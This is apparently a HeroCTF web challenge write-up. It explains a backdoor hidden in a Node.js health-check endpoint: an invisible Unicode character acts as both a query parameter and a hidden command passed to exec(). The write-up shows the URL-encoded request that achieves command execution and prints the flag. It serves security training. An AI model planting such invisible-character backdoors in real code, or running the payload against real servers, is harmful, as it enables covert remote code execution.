# $ where backdoor

### Category

Web

### Description
These web masters are trying to show off their skills. But in reality, there are kind of lazy. They left a backdoor on the server for them to do some maintenance.
Find it, exploit it :)

```
Host : xxxx.heroctf.fr
Port : xxxx
```

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write up

First things first after looking around the website, we indentify the intersting part that allows us to interact with the backend, through a very simple API. It's probably the part we'll need to leverage to gain access to the machine.

Fortunatly, we have access to the source code (at the bottom of the page there is a link to an archive).

The intersting part is the `server_health` endpoint, described in `server/server.js`.

```javascript
app.get('/server_health', cors(corsOptions), async (req, res) => {
    var { timeout,ㅤ} = req.query;
    const checkCommands = [
        '/bin/bash /home/player/scripts/fileIntegrity.sh',
        '/bin/bash /home/player/scripts/isUp.sh localhost:80',
        '/bin/bash /home/player/scripts/isUp.sh localhost:3000',ㅤ
    ];

    var t = 0;
    if (timeout != "") {
        t = parseInt(t);
    }

    try {
        output = ""
        await Promise.all(checkCommands.map(async (cmd) => {
            try {
                r = await exec(cmd, { timeout: t });
                output += r.stdout.trim() || r.stderr.trim();
            } catch (err) {
                output += "";
            }
            output += "\n"
        }));
        res.status(200);
        res.send(output.trim());
    } catch(e) {
        res.status(500);
        res.send('Server status : ERROR');
    }
});
```

The only way to achieve code execution is through the `exec()` function, which is called on every element present in the `checkCommands` list. This is were the challenge gets tricky : there is an invisible variable in this list, after the last `,`. The same element is also present after the `,` on the first line, when the function recovers the parameters from the request query paremeter (with `timeout`).

If you open this write-up (or the original challenge) with Visual Studio Code for exemple, the character will be highlighted. Here it is:
```
ㅤ
```

The urlencoded value of that character is `%E3%85%A4`.

All you have to do to achive remote code execution is to paste `/server_health?%E3%85%A4=<command>` into the websites input field.

```
/server_health?%E3%85%A4=cat%20../flag.txt

File integrity : OK
Hero{1nv1s1b1e_b4ckd0or_w7f}
localhost:80: UP
localhost:3000: UP
```

### Flag

```Hero{1nv1s1b1e_b4ckd0or_w7f}```